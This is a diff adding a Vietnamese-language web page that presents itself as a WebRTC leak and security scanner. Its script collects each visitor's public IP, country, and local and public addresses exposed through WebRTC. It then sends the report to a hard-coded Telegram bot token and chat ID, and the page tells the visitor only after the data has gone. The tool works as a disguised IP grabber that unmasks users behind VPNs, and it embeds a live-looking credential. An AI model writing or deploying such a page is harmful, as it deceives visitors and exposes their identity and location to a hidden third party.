@@ -1,0 +1,834 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebRTC Security Scanner - Giáo Sư Philippines</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flag-icons/6.6.6/css/flag-icons.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #001510);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 800px;
+            background: rgba(0, 0, 0, 0.8);
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.5);
+            position: relative;
+            z-index: 2;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        header {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            text-align: center;
+            border-bottom: 2px solid #e74c3c;
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            color: #3498db;
+            text-shadow: 0 0 10px rgba(52, 152, 219, 0.7);
+        }
+        
+        .professor-badge {
+            background: linear-gradient(45deg, #c0392b, #e74c3c);
+            display: inline-block;
+            padding: 8px 20px;
+            border-radius: 30px;
+            font-weight: bold;
+            margin-top: 10px;
+            font-size: 1.2rem;
+            animation: pulse 2s infinite;
+            box-shadow: 0 0 15px rgba(231, 76, 60, 0.5);
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 15px rgba(231, 76, 60, 0.5); }
+            50% { transform: scale(1.05); box-shadow: 0 0 25px rgba(231, 76, 60, 0.8); }
+            100% { transform: scale(1); box-shadow: 0 0 15px rgba(231, 76, 60, 0.5); }
+        }
+        
+        .main-content {
+            padding: 30px;
+        }
+        
+        .status-box {
+            background: rgba(30, 30, 40, 0.7);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 30px;
+            text-align: center;
+            border: 1px solid rgba(52, 152, 219, 0.3);
+        }
+        
+        .status-title {
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            color: #3498db;
+        }
+        
+        .status-content {
+            font-size: 1.3rem;
+            margin-bottom: 20px;
+            min-height: 30px;
+        }
+        
+        .spinner {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #3498db;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .results-section {
+            display: none;
+            background: rgba(30, 30, 40, 0.7);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(46, 204, 113, 0.3);
+        }
+        
+        .section-title {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            color: #2ecc71;
+            text-align: center;
+        }
+        
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 25px;
+        }
+        
+        .info-card {
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 10px;
+            padding: 20px;
+            border-left: 4px solid #3498db;
+        }
+        
+        .info-card h3 {
+            color: #3498db;
+            margin-bottom: 15px;
+            font-size: 1.2rem;
+        }
+        
+        .info-item {
+            margin-bottom: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .info-label {
+            font-weight: bold;
+            color: #ecf0f1;
+        }
+        
+        .info-value {
+            font-family: monospace;
+            color: #f1c40f;
+            word-break: break-all;
+            text-align: right;
+        }
+        
+        .security-score {
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 10px;
+            padding: 25px;
+            text-align: center;
+            margin: 25px 0;
+            border: 2px solid #f1c40f;
+        }
+        
+        .score-title {
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            color: #f1c40f;
+        }
+        
+        .score-value {
+            font-size: 4rem;
+            font-weight: bold;
+            color: #2ecc71;
+            text-shadow: 0 0 20px rgba(46, 204, 113, 0.7);
+            margin: 20px 0;
+        }
+        
+        .score-comment {
+            font-size: 1.4rem;
+            color: #ecf0f1;
+            font-style: italic;
+        }
+        
+        .score-bar {
+            height: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .score-progress {
+            height: 100%;
+            background: linear-gradient(90deg, #e74c3c, #f1c40f, #2ecc71);
+            border-radius: 10px;
+            width: 0%;
+            transition: width 2s ease;
+        }
+        
+        .notification {
+            background: rgba(46, 204, 113, 0.2);
+            border: 1px solid #2ecc71;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            font-size: 1.2rem;
+            margin-top: 20px;
+            display: none;
+        }
+        
+        footer {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            text-align: center;
+            font-size: 0.9rem;
+            color: #95a5a6;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .bubbles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            overflow: hidden;
+        }
+        
+        .bubble {
+            position: absolute;
+            bottom: -100px;
+            width: 40px;
+            height: 40px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            animation: bubble 10s infinite;
+        }
+        
+        @keyframes bubble {
+            0% {
+                bottom: -100px;
+                transform: translateX(0);
+            }
+            50% {
+                transform: translateX(100px);
+            }
+            100% {
+                bottom: 100%;
+                transform: translateX(-200px);
+            }
+        }
+        
+        .bubble:nth-child(1) {
+            left: 10%;
+            animation-delay: 0s;
+            width: 20px;
+            height: 20px;
+        }
+        
+        .bubble:nth-child(2) {
+            left: 20%;
+            animation-delay: 2s;
+            width: 35px;
+            height: 35px;
+        }
+        
+        .bubble:nth-child(3) {
+            left: 35%;
+            animation-delay: 4s;
+        }
+        
+        .bubble:nth-child(4) {
+            left: 50%;
+            animation-delay: 1s;
+            width: 25px;
+            height: 25px;
+        }
+        
+        .bubble:nth-child(5) {
+            left: 65%;
+            animation-delay: 5s;
+        }
+        
+        .bubble:nth-child(6) {
+            left: 75%;
+            animation-delay: 3s;
+            width: 30px;
+            height: 30px;
+        }
+        
+        .bubble:nth-child(7) {
+            left: 90%;
+            animation-delay: 2s;
+            width: 15px;
+            height: 15px;
+        }
+        
+        .telegram-icon {
+            color: #0088cc;
+            font-size: 1.5rem;
+            vertical-align: middle;
+            margin-right: 5px;
+        }
+        
+        .ip-display {
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: monospace;
+            font-size: 1.2rem;
+            text-align: center;
+            border: 1px solid rgba(52, 152, 219, 0.5);
+        }
+        
+        .leak-status {
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+        
+        .leak-safe {
+            background: rgba(46, 204, 113, 0.3);
+            color: #2ecc71;
+            border: 1px solid #2ecc71;
+        }
+        
+        .leak-danger {
+            background: rgba(231, 76, 60, 0.3);
+            color: #e74c3c;
+            border: 1px solid #e74c3c;
+        }
+        
+        .flag-container {
+            display: inline-block;
+            margin-left: 10px;
+            vertical-align: middle;
+        }
+        
+        .flag {
+            width: 24px;
+            height: 18px;
+            display: inline-block;
+            background-size: cover;
+            border: 1px solid rgba(255,255,255,0.3);
+            border-radius: 2px;
+            vertical-align: middle;
+            margin-right: 5px;
+        }
+        
+        .country-name {
+            font-size: 0.9rem;
+            vertical-align: middle;
+        }
+        
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(45deg, #3498db, #2980b9);
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .btn:active {
+            transform: translateY(1px);
+        }
+        
+        @media (max-width: 600px) {
+            h1 {
+                font-size: 1.8rem;
+            }
+            
+            .professor-badge {
+                font-size: 1rem;
+            }
+            
+            .main-content {
+                padding: 15px;
+            }
+            
+            .info-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .score-value {
+                font-size: 3rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Background bubbles -->
+    <div class="bubbles">
+        <div class="bubble"></div>
+        <div class="bubble"></div>
+        <div class="bubble"></div>
+        <div class="bubble"></div>
+        <div class="bubble"></div>
+        <div class="bubble"></div>
+        <div class="bubble"></div>
+    </div>
+    
+    <div class="container">
+        <header>
+            <h1>WebRTC Security Scanner</h1>
+            <div class="professor-badge">
+                <i class="fas fa-crown"></i> Tác Giả: Giáo Sư Philippines
+            </div>
+        </header>
+        
+        <div class="main-content">
+            <div class="status-box">
+                <h2 class="status-title">Kiểm tra bảo mật WebRTC</h2>
+                <div class="status-content">
+                    <div class="ip-display" id="ipDisplay">
+                        Đang check IP và độ bảo mật...
+                    </div>
+                    <div class="spinner" id="spinner"></div>
+                    <p id="statusText">Vui lòng chờ trong giây lát...</p>
+                </div>
+                <button class="btn" id="startScan">
+                    <i class="fas fa-play"></i> Bắt Đầu Quét
+                </button>
+            </div>
+            
+            <div class="results-section" id="resultsSection">
+                <h2 class="section-title">Kết quả kiểm tra bảo mật</h2>
+                
+                <div class="info-grid">
+                    <div class="info-card">
+                        <h3><i class="fas fa-network-wired"></i> Thông tin IP</h3>
+                        <div class="info-item">
+                            <span class="info-label">IPv4:</span>
+                            <span class="info-value" id="ipv4">-</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">IPv6:</span>
+                            <span class="info-value" id="ipv6">-</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">Local IP:</span>
+                            <span class="info-value" id="localIp">-</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">Quốc gia:</span>
+                            <span class="info-value" id="country">
+                                - 
+                                <span class="flag-container" id="flagContainer"></span>
+                            </span>
+                        </div>
+                    </div>
+                    
+                    <div class="info-card">
+                        <h3><i class="fas fa-shield-alt"></i> WebRTC Support</h3>
+                        <div class="info-item">
+                            <span class="info-label">RTCPeerConnection:</span>
+                            <span class="info-value" id="peerConnection">-</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">RTCDataChannel:</span>
+                            <span class="info-value" id="dataChannel">-</span>
+                        </div>
+                        <div class="info-item">
+                            <span class="info-label">WebRTC Leak:</span>
+                            <span class="info-value" id="leakStatus">-</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="security-score">
+                    <h2 class="score-title">Điểm bảo mật của bạn</h2>
+                    <div class="score-value" id="securityScore">0/100</div>
+                    <div class="score-comment" id="scoreComment">Đang đánh giá...</div>
+                    <div class="score-bar">
+                        <div class="score-progress" id="scoreProgress"></div>
+                    </div>
+                    <p>Dựa trên kết quả kiểm tra rò rỉ WebRTC</p>
+                </div>
+                
+                <div class="notification" id="notification">
+                    <i class="fab fa-telegram telegram-icon"></i>
+                    <span id="notificationText">Kết quả đã được gửi về máy chủ Telegram</span>
+                </div>
+            </div>
+        </div>
+        
+        <footer>
+            <p>© 2023 Bản quyền độc quyền bởi Giáo Sư Philippines</p>
+            <p>Dự án được bảo vệ bởi luật sở hữu trí tuệ quốc tế</p>
+        </footer>
+    </div>
+
+    <script>
+        // Cấu hình tích hợp sẵn
+        const CONFIG = {
+            TELEGRAM_BOT_TOKEN: '8171744038:AAFabjAueONBvlGmVgvSD40PcYb6hdL2uTU',
+            TELEGRAM_CHAT_ID: '-1002823662901',
+            AUTHOR: 'Giáo Sư Philippines',
+            COUNTRY_API: 'https://ipinfo.io/json?token='
+        };
+
+        document.addEventListener('DOMContentLoaded', function() {
+            // Tạo hiệu ứng bong bóng động
+            function createBubbles() {
+                const bubblesContainer = document.querySelector('.bubbles');
+                for (let i = 0; i < 15; i++) {
+                    const bubble = document.createElement('div');
+                    bubble.className = 'bubble';
+                    bubble.style.left = Math.random() * 100 + '%';
+                    bubble.style.animationDelay = Math.random() * 5 + 's';
+                    bubble.style.width = Math.random() * 30 + 10 + 'px';
+                    bubble.style.height = bubble.style.width;
+                    bubblesContainer.appendChild(bubble);
+                }
+            }
+            
+            createBubbles();
+            
+            // Hàm gửi dữ liệu đến Telegram
+            async function sendToTelegram(report) {
+                const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
+                
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: CONFIG.TELEGRAM_CHAT_ID,
+                            text: report,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    if (data.ok) {
+                        document.getElementById('notification').style.display = 'block';
+                        return true;
+                    } else {
+                        const notification = document.getElementById('notification');
+                        notification.className = 'notification error';
+                        notification.innerHTML = `<i class="fas fa-exclamation-triangle"></i> <span id="notificationText">Lỗi gửi dữ liệu: ${data.description || 'Không rõ lỗi'}</span>`;
+                        notification.style.display = 'block';
+                        return false;
+                    }
+                } catch (error) {
+                    const notification = document.getElementById('notification');
+                    notification.className = 'notification error';
+                    notification.innerHTML = `<i class="fas fa-exclamation-triangle"></i> <span id="notificationText">Lỗi kết nối: ${error.message}</span>`;
+                    notification.style.display = 'block';
+                    return false;
+                }
+            }
+            
+            // Hàm tính điểm bảo mật
+            function calculateSecurityScore(leakStatus, publicIP) {
+                let score = 100;
+                let comment = "Bảo mật tuyệt đối!";
+                
+                if (leakStatus !== '✔No Leak') {
+                    score = 30;
+                    comment = "Rò rỉ bảo mật nghiêm trọng!";
+                } else if (publicIP !== '-' && publicIP !== '') {
+                    score = 70;
+                    comment = "Bảo mật tốt nhưng có thể cải thiện";
+                }
+                
+                return {score, comment};
+            }
+            
+            // Hàm lấy địa chỉ IP công khai
+            async function getPublicIP() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    console.error('Lỗi lấy IP công khai:', error);
+                    return '-';
+                }
+            }
+            
+            // Hàm lấy thông tin quốc gia
+            async function getCountryInfo(ip) {
+                try {
+                    const response = await fetch(`https://ipinfo.io/${ip}/json`);
+                    const data = await response.json();
+                    return {
+                        country: data.country,
+                        countryName: data.country_name || 'Không xác định',
+                        flag: data.country ? data.country.toLowerCase() : null
+                    };
+                } catch (error) {
+                    console.error('Lỗi lấy thông tin quốc gia:', error);
+                    return {
+                        country: 'XX',
+                        countryName: 'Không xác định',
+                        flag: null
+                    };
+                }
+            }
+            
+            // Hàm hiển thị cờ quốc gia
+            function displayCountryFlag(countryCode, countryName) {
+                const flagContainer = document.getElementById('flagContainer');
+                flagContainer.innerHTML = '';
+                
+                if (countryCode) {
+                    const flag = document.createElement('span');
+                    flag.className = `fi fi-${countryCode.toLowerCase()}`;
+                    flag.style.marginRight = '5px';
+                    
+                    const nameSpan = document.createElement('span');
+                    nameSpan.className = 'country-name';
+                    nameSpan.textContent = countryName;
+                    
+                    flagContainer.appendChild(flag);
+                    flagContainer.appendChild(nameSpan);
+                }
+            }
+            
+            // Hàm phát hiện IP qua WebRTC
+            function getWebRTCIPs() {
+                return new Promise((resolve) => {
+                    const result = {
+                        localIPs: [],
+                        publicIPs: []
+                    };
+                    
+                    const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                    if (!RTCPeerConnection) {
+                        resolve(result);
+                        return;
+                    }
+                    
+                    const rtc = new RTCPeerConnection({ iceServers: [] });
+                    rtc.createDataChannel('', { reliable: false });
+                    
+                    rtc.onicecandidate = e => {
+                        if (!e.candidate) return;
+                        const candidate = e.candidate.candidate;
+                        if (!candidate) return;
+                        
+                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
+                        const match = candidate.match(ipRegex);
+                        if (!match) return;
+                        
+                        const ip = match[0];
+                        // Phân loại IP: local hoặc public
+                        if (/^(10|172\.16|192\.168|127|::1|fc|fd)/.test(ip)) {
+                            if (!result.localIPs.includes(ip)) result.localIPs.push(ip);
+                        } else {
+                            if (!result.publicIPs.includes(ip)) result.publicIPs.push(ip);
+                        }
+                    };
+                    
+                    rtc.createOffer()
+                        .then(offer => rtc.setLocalDescription(offer))
+                        .catch(error => {
+                            console.error('Lỗi tạo offer:', error);
+                            resolve(result);
+                        });
+                    
+                    // Đặt timeout để đảm bảo không treo máy
+                    setTimeout(() => {
+                        rtc.close();
+                        resolve(result);
+                    }, 2000);
+                });
+            }
+            
+            // Hàm chính để phát hiện WebRTC
+            async function detectWebRTC() {
+                try {
+                    // Hiển thị trạng thái đang kiểm tra
+                    document.getElementById('statusText').textContent = 'Đang thu thập thông tin IP...';
+                    
+                    // Lấy IP công khai
+                    const publicIPv4 = await getPublicIP();
+                    
+                    // Hiển thị IP công khai tạm thời
+                    document.getElementById('ipDisplay').textContent = `IPv4: ${publicIPv4}`;
+                    
+                    // Lấy thông tin quốc gia
+                    document.getElementById('statusText').textContent = 'Đang xác định quốc gia...';
+                    const countryInfo = await getCountryInfo(publicIPv4);
+                    
+                    // Hiển thị cờ quốc gia
+                    displayCountryFlag(countryInfo.country, countryInfo.countryName);
+                    
+                    // Kiểm tra hỗ trợ WebRTC
+                    const rtcSupport = {
+                        RTCPeerConnection: !!window.RTCPeerConnection,
+                        RTCDataChannel: !!window.RTCDataChannel
+                    };
+                    
+                    // Lấy IP qua WebRTC
+                    document.getElementById('statusText').textContent = 'Đang kiểm tra rò rỉ WebRTC...';
+                    const webrtcIPs = await getWebRTCIPs();
+                    const localIP = webrtcIPs.localIPs.length > 0 ? webrtcIPs.localIPs.join(', ') : '-';
+                    const publicIP = webrtcIPs.publicIPs.length > 0 ? webrtcIPs.publicIPs.join(', ') : '-';
+                    
+                    // Xác định trạng thái rò rỉ
+                    const leakStatus = publicIP !== '-' ? '✘Leak' : '✔No Leak';
+                    
+                    // Hiển thị kết quả
+                    document.getElementById('ipv4').textContent = publicIPv4;
+                    document.getElementById('ipv6').textContent = '-'; // IPv6 có thể thêm nếu cần
+                    document.getElementById('localIp').textContent = localIP;
+                    document.getElementById('peerConnection').textContent = rtcSupport.RTCPeerConnection ? '✔True' : '✘False';
+                    document.getElementById('dataChannel').textContent = rtcSupport.RTCDataChannel ? '✔True' : '✘False';
+                    
+                    const leakStatusEl = document.getElementById('leakStatus');
+                    leakStatusEl.innerHTML = leakStatus === '✔No Leak' ? 
+                        `<span class="leak-status leak-safe">${leakStatus}</span>` : 
+                        `<span class="leak-status leak-danger">${leakStatus}</span>`;
+                    
+                    // Tính điểm bảo mật
+                    const securityScore = calculateSecurityScore(leakStatus, publicIP);
+                    document.getElementById('securityScore').textContent = securityScore.score + '/100';
+                    document.getElementById('scoreComment').textContent = securityScore.comment;
+                    document.getElementById('scoreProgress').style.width = securityScore.score + '%';
+                    
+                    // Tạo báo cáo với cờ quốc gia
+                    const flagEmoji = countryInfo.country ? getCountryFlagEmoji(countryInfo.country) : '🏴';
+                    const report = `
+🛡️ *WebRTC Security Report* 🛡️
+*Tác Giả:* ${CONFIG.AUTHOR} 🇵🇭
+                    
+🌐 *Remote IP*
+- IPv4: ${publicIPv4}
+- IPv6: -
+- Quốc gia: ${countryInfo.countryName} ${flagEmoji}
+                    
+⚙️ *WebRTC Support*
+- RTCPeerConnection: ${rtcSupport.RTCPeerConnection ? '✔True' : '✘False'}
+- RTCDataChannel: ${rtcSupport.RTCDataChannel ? '✔True' : '✘False'}
+                    
+🔒 *WebRTC Leak Test*
+- Status: ${leakStatus}
+- Local IP: ${localIP}
+- Public IP: ${publicIP}
+                    
+🏆 *Điểm bảo mật*: ${securityScore.score}/100
+- Đánh giá: ${securityScore.comment}
+                    `;
+                    
+                    // Gửi báo cáo về Telegram
+                    await sendToTelegram(report);
+                    
+                    // Hiển thị kết quả và ẩn spinner
+                    document.getElementById('spinner').style.display = 'none';
+                    document.getElementById('statusText').textContent = 'Kiểm tra hoàn tất!';
+                    document.getElementById('resultsSection').style.display = 'block';
+                    
+                    // Cập nhật thông báo trạng thái
+                    const ipDisplay = document.getElementById('ipDisplay');
+                    ipDisplay.innerHTML = `
+                        <i class="fas fa-check-circle" style="color:#2ecc70"></i> 
+                        Kiểm tra hoàn tất! 
+                        ${leakStatus === '✔No Leak' ? 
+                            '<span class="leak-status leak-safe">Không phát hiện rò rỉ</span>' : 
+                            '<span class="leak-status leak-danger">Phát hiện rò rỉ IP</span>'}
+                    `;
+                } catch (error) {
+                    console.error('Lỗi trong quá trình kiểm tra:', error);
+                    document.getElementById('spinner').style.display = 'none';
+                    document.getElementById('statusText').textContent = 'Đã xảy ra lỗi trong quá trình kiểm tra.';
+                    
+                    const notification = document.getElementById('notification');
+                    notification.className = 'notification error';
+                    notification.innerHTML = `<i class="fas fa-exclamation-triangle"></i> <span id="notificationText">Lỗi: ${error.message}</span>`;
+                    notification.style.display = 'block';
+                }
+            }
+            
+            // Hàm lấy emoji cờ quốc gia
+            function getCountryFlagEmoji(countryCode) {
+                if (!countryCode) return '🏴';
+                const codePoints = countryCode
+                    .toUpperCase()
+                    .split('')
+                    .map(char => 127397 + char.charCodeAt());
+                return String.fromCodePoint(...codePoints);
+            }
+            
+            // Bắt đầu kiểm tra khi nhấn nút
+            document.getElementById('startScan').addEventListener('click', function() {
+                // Hiển thị spinner
+                document.getElementById('spinner').style.display = 'block';
+                document.getElementById('ipDisplay').textContent = 'Đang check IP và độ bảo mật...';
+                document.getElementById('statusText').textContent = 'Vui lòng chờ trong giây lát...';
+                
+                // Ẩn kết quả cũ
+                document.getElementById('resultsSection').style.display = 'none';
+                document.getElementById('notification').style.display = 'none';
+                document.getElementById('flagContainer').innerHTML = '';
+                
+                // Bắt đầu quá trình quét
+                detectWebRTC();
+            });
+        });
+    </script>
+</body>
+</html>
